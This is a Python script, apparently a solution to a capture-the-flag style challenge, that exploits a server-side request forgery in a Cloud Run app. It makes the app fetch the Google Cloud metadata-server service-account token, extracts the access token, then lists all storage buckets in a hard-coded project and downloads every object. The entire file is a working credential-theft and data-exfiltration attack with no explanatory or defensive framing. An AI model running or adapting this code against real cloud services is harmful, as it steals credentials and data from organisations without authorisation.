import requests
import json
from bs4 import BeautifulSoup

def get_access_token():
    # Define URL and data for the POST request
    url = "https://leaky-bucket-jobztbckaq-uc.a.run.app/result"
    data = {
        "inputUrl": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "inputHeader": '{"Metadata-Flavor": "Google"}'
    }
    
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36"
    }

    response = requests.post(url, data=data, headers=headers)
    soup = BeautifulSoup(response.content, "html.parser")
    
    # Find the table cell with the token data
    token_data_cell = soup.find("td")
    if token_data_cell:
        # Parse the token JSON string and retrieve the 'access_token' field
        token_data = json.loads(token_data_cell.text.replace("&#34;", '"'))
        return token_data["access_token"]
    else:
        raise Exception("Unable to fetch token from the server's response.")

def list_buckets_and_objects_urls(project_id, access_token):
    endpoint = f'https://storage.googleapis.com/storage/v1/b?project={project_id}'
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Accept': 'application/json'
    }

    response = requests.get(endpoint, headers=headers)
    
    if response.status_code == 200:
        buckets_info = response.json()
        bucket_names = [bucket['name'] for bucket in buckets_info.get('items', [])]
        
        # Initialize an empty dictionary to store the contents for each bucket
        buckets_objects_urls = {}
        
        for bucket_name in bucket_names:
            # Fetch the contents of the bucket
            objects_endpoint = f'https://storage.googleapis.com/storage/v1/b/{bucket_name}/o'
            objects_response = requests.get(objects_endpoint, headers=headers)
            
            if objects_response.status_code == 200:
                objects_info = objects_response.json()
                object_names = [obj['name'] for obj in objects_info.get('items', [])]
                object_urls = [f"https://storage.googleapis.com/{bucket_name}/{obj_name}" for obj_name in object_names]
                buckets_objects_urls[bucket_name] = object_urls
            else:
                print(f"Error fetching contents for bucket {bucket_name}: {objects_response.status_code}: {objects_response.text}")
                buckets_objects_urls[bucket_name] = None
        
        return buckets_objects_urls

    else:
        print(f"Error {response.status_code}: {response.text}")
        return None

def download_file(url, access_token, destination):
    headers = {
        'Authorization': f'Bearer {access_token}',
    }
    response = requests.get(url, headers=headers, stream=True)
    response.raise_for_status()

    with open(destination, 'wb') as file:
        for chunk in response.iter_content(chunk_size=8192): 
            file.write(chunk)


if __name__ == "__main__":
    PROJECT_ID = 'optimal-jigsaw-390814'  # get project_id using the new function
    ACCESS_TOKEN = get_access_token()  # fetch a fresh token for each execution
    
    buckets_objects_urls = list_buckets_and_objects_urls(PROJECT_ID, ACCESS_TOKEN)
    for bucket, object_urls in buckets_objects_urls.items():
        print(f"Downloadable URLs for objects in bucket {bucket}:")
        if object_urls:
            for url in object_urls:
                print(f"  - {url}")
                download_file(url, ACCESS_TOKEN, f'./downloads/{url.split("/")[-1]}')
        else:
            print("  (Error or empty)")
        print()
